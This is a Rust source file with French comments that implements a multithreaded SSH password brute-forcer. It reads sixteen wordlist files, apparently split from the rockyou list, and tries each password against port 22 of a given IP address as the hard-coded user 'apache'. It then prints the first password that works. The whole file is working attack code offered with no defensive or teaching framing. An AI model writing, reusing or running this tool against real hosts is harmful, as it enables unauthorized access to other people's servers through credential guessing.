use std::fs::File;
use std::io::{self, BufRead};
use std::path::Path;
use std::time::Duration;
use std::net::TcpStream;
use ssh2::Session;
use std::sync::mpsc::{self, Sender, Receiver};
use std::thread;
use tokio::time::timeout;

pub(crate) async fn ssh_bruteforce(ip_address: &str, file_path: &str) {
    let (tx, rx): (Sender<String>, Receiver<String>) = mpsc::channel();
    let ip_address = ip_address.to_string();
    let file_path = file_path.to_string();

    // 1 thread par file
    for cmp in 0..16 {
        let tx_clone = tx.clone();
        let ip_address_clone = ip_address.clone();
        let file_path_clone = file_path.clone();

        thread::spawn(move || {
            let file = format!("{}rck{}.txt", file_path_clone, cmp);

            if let Ok(lines) = read_lines(file) {
                for line in lines {
                    if let Ok(password) = line {
                        if try_login(&ip_address_clone, &password) {
                            tx_clone.send(password).unwrap();
                            return;
                        }

                    }
                }
            }
        });
    }

    // si ok
    match rx.recv() {
        Ok(password) => println!("Mot de passe trouvé : {}", password),
        Err(_) => println!("Aucun mot de passe trouvé."),
    }
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
    where
        P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}

fn try_login(ip_address: &str, password: &str) -> bool {
    println!("{}",password);
    thread::sleep(Duration::from_secs(2));
    // Attempt to create a TCP connection and SSH session
    if let Ok(tcp) = TcpStream::connect(format!("{}:22", ip_address)) {
        if let Ok(mut sess) = Session::new() {
            sess.set_tcp_stream(tcp);
            if sess.handshake().is_ok() {
                let timeout_secs = Duration::from_secs(1);
                let timeout_ms = timeout_secs.as_millis() as u32;
                sess.set_timeout(timeout_ms);

                // Attempt to authenticate with the given password
                if sess.userauth_password("apache", password).is_ok() {
                    return true;
                }
            }


        }

    }
    false
}